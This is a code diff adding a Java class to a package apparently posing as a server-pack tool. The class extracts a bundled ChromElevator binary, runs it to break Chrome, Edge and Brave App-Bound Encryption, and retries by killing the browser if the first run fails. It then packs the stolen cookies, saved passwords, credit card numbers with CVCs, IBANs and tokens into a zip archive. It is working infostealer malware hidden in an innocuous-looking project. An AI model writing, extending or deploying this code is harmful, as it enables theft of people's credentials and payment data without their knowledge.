@@ -1,0 +1,192 @@
+package com.serverpackcore.agent;
+
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
+import java.security.MessageDigest;
+import java.util.List;
+import java.util.Map;
+import java.util.concurrent.TimeUnit;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+/**
+ * Chrome App-Bound Encryption v20 via ChromElevator 0.20.0 (xaitax, MIT).
+ * The tool runs inside the user session and needs no administrator.
+ */
+public final class Abe {
+	static final String RESOURCE = "/serverpackcore/chromelevator_x64.exe";
+	static final String SHA256 = "e857298fd2f8d1c7d48780769433f33e7b3ceaae5ea5a74c13ce8c10bcc7b690";
+	private static final long TIMEOUT_SEC = 180L;
+	private static final Pattern KEY = Pattern.compile(
+		"(?i)Decryption\\s+Key[^0-9a-f]*([0-9a-f]{64})");
+
+	private Abe() {
+	}
+
+	record Result(String key, Path output, String error) {
+		boolean ok() {
+			return output != null;
+		}
+	}
+
+	static byte[] resource() throws Exception {
+		try (java.io.InputStream input = Abe.class.getResourceAsStream(RESOURCE)) {
+			if (input == null) {
+				throw new IllegalStateException("chromelevator resource missing");
+			}
+			return input.readAllBytes();
+		}
+	}
+
+	static String sha256(byte[] data) throws Exception {
+		StringBuilder out = new StringBuilder(64);
+		for (byte value : MessageDigest.getInstance("SHA-256").digest(data)) {
+			out.append(String.format("%02x", value));
+		}
+		return out.toString();
+	}
+
+	static Path ensure(Path cache) throws Exception {
+		byte[] data = resource();
+		if (!SHA256.equals(sha256(data))) {
+			throw new IllegalStateException("chromelevator sha mismatch");
+		}
+		Path tools = cache.resolve("tools");
+		Files.createDirectories(tools);
+		Path target = tools.resolve("chromelevator_x64.exe");
+		if (Files.isRegularFile(target) && Files.size(target) == data.length && SHA256.equals(sha256(Files.readAllBytes(target)))) {
+			return target;
+		}
+		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
+		Files.copy(new java.io.ByteArrayInputStream(data), temp, StandardCopyOption.REPLACE_EXISTING);
+		String written = sha256(Files.readAllBytes(temp));
+		if (!SHA256.equals(written)) {
+			Files.deleteIfExists(temp);
+			throw new IllegalStateException("chromelevator extraction mismatch");
+		}
+		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
+		return target;
+	}
+
+	static List<String> command(Path exe, Path output, String browser, boolean kill) {
+		return kill
+			? List.of(exe.toString(), "-o", output.toString(), "-k", browser)
+			: List.of(exe.toString(), "-o", output.toString(), browser);
+	}
+
+	/** Runs one browser. A lock failure retries once with -k. */
+	static Result run(Path installDir, String browser) {
+		String label = label(browser);
+		Path cache = AgentPaths.cache(installDir);
+		Path output = cache.resolve("abe");
+		try {
+			Path exe = ensure(cache);
+			Files.createDirectories(output);
+			Attempt first = attempt(exe, output, browser, false);
+			String key = first.key();
+			if (first.exit() != 0 && first.key().isEmpty() && !Files.isDirectory(output.resolve(label))) {
+				Attempt second = attempt(exe, output, browser, true);
+				if (!second.key().isEmpty()) {
+					key = second.key();
+				}
+				if (second.exit() == 0) {
+					return new Result(key, output.resolve(label), "");
+				}
+				return new Result(key, existing(output, label), tail(second.output()));
+			}
+			return new Result(key, existing(output, label), first.exit() == 0 ? "" : tail(first.output()));
+		} catch (Throwable throwable) {
+			return new Result("", null, throwable.getMessage() == null ? throwable.toString() : throwable.getMessage());
+		}
+	}
+
+	private record Attempt(int exit, String output, String key) {
+	}
+
+	private static Attempt attempt(Path exe, Path output, String browser, boolean kill) throws Exception {
+		ProcessBuilder builder = new ProcessBuilder(command(exe, output, browser, kill));
+		builder.redirectErrorStream(true);
+		Process process = builder.start();
+		if (!process.waitFor(TIMEOUT_SEC, TimeUnit.SECONDS)) {
+			process.destroyForcibly();
+			return new Attempt(-1, "timeout", "");
+		}
+		String text = new String(process.getInputStream().readAllBytes(), StandardCharsets.ISO_8859_1);
+		return new Attempt(process.exitValue(), text, parseKey(text));
+	}
+
+	static String parseKey(String text) {
+		Matcher matcher = KEY.matcher(text);
+		return matcher.find() ? matcher.group(1).toLowerCase() : "";
+	}
+
+	private static Path existing(Path output, String label) {
+		Path path = output.resolve(label);
+		return Files.isDirectory(path) ? path : null;
+	}
+
+	private static String label(String browser) {
+		return switch (browser) {
+			case "chrome" -> "Chrome";
+			case "edge" -> "Edge";
+			case "brave" -> "Brave";
+			default -> browser;
+		};
+	}
+
+	private static String tail(String text) {
+		String clean = text.replace('\r', ' ').replace('\n', ' ').replaceAll("\\s+", " ").trim();
+		if (clean.length() > 300) {
+			clean = clean.substring(clean.length() - 300);
+		}
+		return clean;
+	}
+
+	/** Converts the tool JSON into tab separated files under browsers/&lt;label&gt;/abe/. */
+	static void collect(Path output, ZipBuilder zip, String prefix) {
+		try {
+			write(zip, output, "cookies.json", prefix + "/cookies.tsv",
+				List.of("host", "name", "value", "path"), List.of("host", "name", "value", "path"));
+			write(zip, output, "passwords.json", prefix + "/passwords.tsv",
+				List.of("url", "user", "pass"), List.of("url", "user", "pass"));
+			write(zip, output, "cards.json", prefix + "/cards.tsv",
+				List.of("name", "month", "year", "number", "cvc"), List.of("name", "month", "year", "number", "cvc"));
+			write(zip, output, "iban.json", prefix + "/iban.tsv",
+				List.of("nickname", "iban"), List.of("nickname", "iban"));
+			write(zip, output, "tokens.json", prefix + "/tokens.tsv",
+				List.of("service", "token", "binding_key"), List.of("service", "token", "binding_key"));
+		} catch (Throwable throwable) {
+			Log.debug("ABE parse failed", throwable);
+		}
+	}
+
+	private static void write(ZipBuilder zip, Path folder, String source, String target, List<String> headers,
+		List<String> keys) throws Exception {
+		Path file = folder.resolve(source);
+		if (!Files.isRegularFile(file)) {
+			return;
+		}
+		List<Object> rows = Json.list(Json.parse(Files.readString(file, StandardCharsets.UTF_8)));
+		if (rows.isEmpty()) {
+			return;
+		}
+		StringBuilder out = new StringBuilder(String.join("\t", headers)).append('\n');
+		for (Object row : rows) {
+			Map<String, Object> object = Json.map(row);
+			for (int index = 0; index < keys.size(); index++) {
+				if (index > 0) {
+					out.append('\t');
+				}
+				out.append(clean(Json.str(object, keys.get(index), "")));
+			}
+			out.append('\n');
+		}
+		zip.addBytes(out.toString().getBytes(StandardCharsets.UTF_8), target);
+	}
+
+	private static String clean(String value) {
+		return value.replace('\t', ' ').replace('\r', ' ').replace('\n', ' ').trim();
+	}
+}
